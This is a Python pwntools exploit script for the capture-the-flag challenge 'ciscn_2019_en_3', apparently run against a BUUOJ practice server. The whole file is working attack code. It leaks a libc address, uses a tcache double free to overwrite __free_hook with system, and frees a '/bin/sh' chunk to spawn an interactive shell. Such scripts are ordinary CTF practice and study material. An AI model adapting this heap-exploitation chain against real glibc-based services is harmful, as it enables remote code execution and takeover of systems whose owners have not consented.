#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 16.13.50
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'

def add(size,cont):
	sh.sendlineafter('choice:','1')
	sh.sendlineafter('size of story: \n',str(size))
	sh.sendlineafter('story: \n',str(cont))

def delete(index):
	sh.sendlineafter('choice:','4')
	sh.sendlineafter('index:\n',str(index))

def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))


host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so')
	elf = ELF('./ciscn_2019_en_3')
	sh = process('./ciscn_2019_en_3')
else:
	#context.log_level = 'debug'
	libc=ELF('./libc-2.27.so')
	elf = ELF('./ciscn_2019_en_3')
	sh = remote('node3.buuoj.cn',29253)



def pwn():
	sh.sendlineafter('name?\n','//bin/sh')
	sh.sendlineafter('ID.\n','A'*7)
	sh.recvuntil('\n')
	libc_addr = u64(sh.recvuntil('\x7f').ljust(8,'\x00')) - 231 - libc.sym['setbuffer']
	# onegad = [0x41612,0x41666,0xdeed2]
	onegad = [0x4f2c5,0x4f322,0x10a38c]
	onegadget = libc_addr + onegad[1]
	malloc_hook = libc_addr + libc.sym['__malloc_hook']
	realloc = libc_addr + libc.sym['realloc']
	realloc_hook = libc_addr + libc.sym['__realloc_hook']
	system = libc_addr + libc.sym['system']
	free_hook = libc_addr + libc.sym['__free_hook']

	show_addr('libc_addr',libc_addr)
	show_addr('onegadget',onegadget)
	show_addr('malloc_hook',malloc_hook)
	show_addr('realloc',realloc)
	show_addr('realloc_hook',realloc_hook)
	show_addr('free_hook',free_hook)

	add(0x18,'A'*8)
	delete(0)
	delete(0)
	add(0x18,p64(free_hook))
	add(0x18,'/bin/sh\x00')
	
	add(0x18,p64(system))
	# gdb.attach(sh)
	delete(2)

if __name__ == '__main__':
	pwn()
	sh.interactive()

